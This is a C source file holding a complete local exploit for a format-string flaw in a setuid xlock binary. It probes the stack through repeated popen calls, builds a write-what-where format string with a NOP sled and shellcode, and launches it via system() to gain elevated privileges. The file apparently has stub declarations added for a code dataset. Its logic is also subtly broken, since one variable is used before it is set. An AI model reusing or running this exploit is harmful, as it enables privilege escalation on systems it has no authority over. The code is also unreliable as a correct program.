
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct stat {int st_mode; } ;
typedef int FILE ;


 int BIGBREAKFAST ;
 int CMDSIZE ;
 int FMTSIZE ;
 int OFFSET ;
 int S_ISUID ;
 int S_IXOTH ;
 char* XLOCK_PATH ;
 int atoi (char*) ;
 int errno ;
 int error (int,int ,char*) ;
 int fclose (int *) ;
 int fread (char*,int,int,int *) ;
 int free (char*) ;
 int memcpy (char*,char*,int) ;
 int memset (char*,int,int) ;
 char* mkfmt (int,int,unsigned long,unsigned long) ;
 int * popen (char*,char*) ;
 int printf (char*,...) ;
 int puts (char*) ;
 int shellcode ;
 int sprintf (char*,char*,char*,char*) ;
 int stat (char*,struct stat*) ;
 int strcmp (char*,char*) ;
 int strcpy (char*,int ) ;
 int strlen (char*) ;
 int strstr (char*,char*) ;
 char* strtok (char*,char*) ;
 unsigned long strtoul (char*,int *,int) ;
 int system (char*) ;

int main(int argc, char **argv){
    FILE *fp;
    char output[65536];
    char fmtstr[FMTSIZE];
    char command[CMDSIZE];
    int i;
    char *p;
    int prebuf;
    int breakfast;
    unsigned long int location;
    unsigned long int value;
    int shellcode_size = sizeof shellcode;
    int offset = OFFSET;
    struct stat f;

    i = stat(XLOCK_PATH, &f);
    if (i) error(1, errno, "whereis xlock?");
    if (!(f.st_mode & S_IXOTH)) error(1, 0, "executable?");
    if (!(f.st_mode & S_ISUID)) error(1, 0, "not setuid");

    if (argc > 1) {
        offset = atoi(argv[1]);
    }





    memset(output, 0, 65536);
    memset(fmtstr, 0x20, FMTSIZE);

    for (i = 0, p = fmtstr; i < BIGBREAKFAST; i++) {
        memcpy(p, "%.8x ", 5);
        p += 5;
    }






    memset(fmtstr, 0x20, 10);
    fmtstr[FMTSIZE - 1] = 0x00;







    i = 0;
    do {
        prebuf = i;
        memset(fmtstr, 0x03, i);
        memset(fmtstr + i, 0x01, 4);
        sprintf(command, "%s -d '%s' 2>&1", XLOCK_PATH, fmtstr);
        fp = popen(command, "r");
        memset(output, 0, 65536);
        fread(output, 1024, 64, fp);
        fclose(fp);



        i++;
    } while (!strstr(output, "01010101") && i < 4);

    if (prebuf == 4){
        error(1, 0, "could not find fmt str on the stack");
    }


    memset(output, 0x20, 40);
    p = strtok(output, "\x20");






    location = strtoul(p, ((void*)0), 16);
    location -= offset;
    value = location
            + 12
            + breakfast * 4
            + FMTSIZE
            - shellcode_size
            - 100;






    for (breakfast = 1; ; breakfast++) {
        p = strtok(((void*)0), "\x20");
        if (!p) error(1, 0, "reached end of output string and no 01010101");



        if (!strcmp(p, "01010101")) break;
    }






    p = mkfmt(prebuf, breakfast, location, value);
    memset(fmtstr, 0x90, FMTSIZE);
    memcpy(fmtstr, p, strlen(p));
    free(p);
    p = (char *) &fmtstr[FMTSIZE - shellcode_size];
    strcpy(p, shellcode);

    sprintf(command, "%s -d '%s'", XLOCK_PATH, fmtstr);
    puts("====== system() ======");
    i = system(command);
    puts("====== end system ======");

    printf("\nsystem() returned %d\n", i);
    printf("prebuf was %d bytes\n", prebuf);
    printf("breakfast was %d words\n", breakfast);
    printf("location was %.8lx\n", location);
    printf("value was %.8lx\n", value);

    puts("exiting.");
    return 0;
}
